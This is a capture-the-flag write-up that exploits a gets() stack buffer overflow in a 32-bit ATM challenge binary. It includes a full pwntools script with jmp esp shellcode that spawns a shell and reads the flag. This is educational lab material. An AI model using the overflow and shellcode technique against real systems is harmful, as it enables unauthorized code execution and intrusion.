# Global Cash ATM — PWN Writeup

## Challenge Info
- **Type:** PWN (32-bit ELF, i386)
- **Binary:** `bank_chall` — stripped, statically-linked-like (dynamically linked, but RXW stack)
- **Remote:** `labs.ctfzone.com:8327`

## Analysis

### Binary Protections
```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX disabled — Stack is EXECUTABLE (RWX segments)
PIE:        No PIE (0x8048000)
```

### Program Flow
1. **Login** — asks for username/password (admin/admin works)
2. **Main Menu** — 4 options: Balance, Deposit, Withdraw, Exit
3. **Deposit** — adds to global balance (scanf with `%d`)
4. **Withdraw** — subtracts from balance. On success, calls the **comment function**
5. **Comment Function** — prints a prompt, calls **`gets(buffer)`** — classic buffer overflow

### Vulnerability: Stack Buffer Overflow in `gets()`
The comment function at `0x80491e8`:

```
push   ebp
mov    ebp, esp
push   ebx
sub    esp, 0x44          ; 68 bytes of locals
...
lea    eax, [ebp-0x48]    ; buffer at ebp - 72 bytes
push   eax
call   gets@plt           ; UNRESTRICTED OVERFLOW
...
mov    ebx, [ebp-4]
leave                      ; mov esp, ebp; pop ebp
ret
```

`gets()` reads unbounded input into a 72-byte buffer (at best), giving us control of the saved EBP and return address.

### Stack Layout
| Offset from buffer | Contents |
|---|---|
| 0–67  | Local vars / padding |
| 68–71 | Saved EBX |
| 72–75 | Saved EBP |
| 76–79 | Return address |
| 80+   | Past return (where ESP will point after ret) |

### Exploit Strategy
Since the stack is **executable (RWX)** and there's **no canary** and **no PIE**:

1. **Padding**: 72 bytes `'A'` to reach saved EBP
2. **Fake EBP**: a writable address (`0x804c030` / BSS) so the `leave` instruction doesn't crash
3. **Return address**: `jmp esp` gadget at `0x080491e3` — after `ret`, ESP points right after the return address, so `jmp esp` jumps to our shellcode
4. **Shellcode**: 23-byte `execve("/bin///sh", ["/bin///sh"], NULL)` x86 shellcode

After the shell spawns, send `cat flag.txt` to read the flag.

## Exploit

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

HOST = 'labs.ctfzone.com'
PORT = 8327

jmp_esp = 0x080491e3

sc = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
''')

payload = b'A' * 72
payload += p32(0x804c030)  # fake ebp (writable BSS)
payload += p32(jmp_esp)    # ret -> jmp esp
payload += sc              # shellcode

r = remote(HOST, PORT)

r.recvuntil(b'Username:')
r.sendline(b'admin')
r.recvuntil(b'Password:')
r.sendline(b'admin')

r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b'Enter amount to deposit:')
r.sendline(b'100')

r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'Enter amount:')
r.sendline(b'1')

r.recvuntil(b'comment')
r.sendline(payload)

sleep(1)
r.sendline(b'cat flag.txt')

data = r.recvall(timeout=5)
print(data.decode(errors='replace'))
```

## Flag
```
ctfzone{pwn_th3_v@u1t_32b1t_635447345}
```
